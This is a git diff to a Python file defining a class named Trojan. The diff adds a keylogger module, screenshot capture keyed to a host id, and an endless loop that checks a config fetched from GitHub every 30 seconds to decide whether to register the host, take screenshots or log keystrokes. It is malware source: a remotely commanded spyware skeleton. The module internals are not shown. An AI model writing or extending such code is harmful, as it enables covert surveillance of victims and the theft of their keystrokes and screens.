@@ -1,22 +1,27 @@
 import asyncio
 import json
 import os
+from time import sleep
 from mod1_sysinfo import SysInfo
 from mod2_screenshotter import Screenshotter
+from mod3_keylogger import Keylogger
 from get_config_from_github import Config
 
 class Trojan:
     def __init__(self):
         self.get_config()
         self.host_info = SysInfo().fetch_info()
-        self.screenshotter = Screenshotter
-        self.controller()
+        self.screenshotter = Screenshotter(self.host_info['id'])
+        self.keylogger = Keylogger(self.host_info['id'])
+        
+        while True:
+            self.controller()
+            sleep(30)
 
     def get_config(self):
         self.config = Config().get_config()
 
     def initiate_host(self):
-        print(self.host_info)
         host_id = self.host_info['id']
         
         script_dir = os.path.dirname(os.path.realpath(__file__))
@@ -33,14 +38,24 @@ class Trojan:
 
     
     def controller(self):
-        print(self.config)
+        module = self.config['module']
+        self.reset_modules()
 
+        if module == 1:
+            self.initiate_host()
 
-    def module2_ss(self):
-        asyncio.create_task(self.screenshotter.start())
+        if module == 2:
+            self.screenshotter.take_ss()
 
-    def module2_ss_stop(self):
-        self.screenshotter.stop()
+        if module == 3:
+            self.keylogger.start()
+
+        if module == 4:
+            pass
+
+    def reset_modules(self):
+        self.keylogger.stop()
+
 
 
 if __name__ == '__main__':
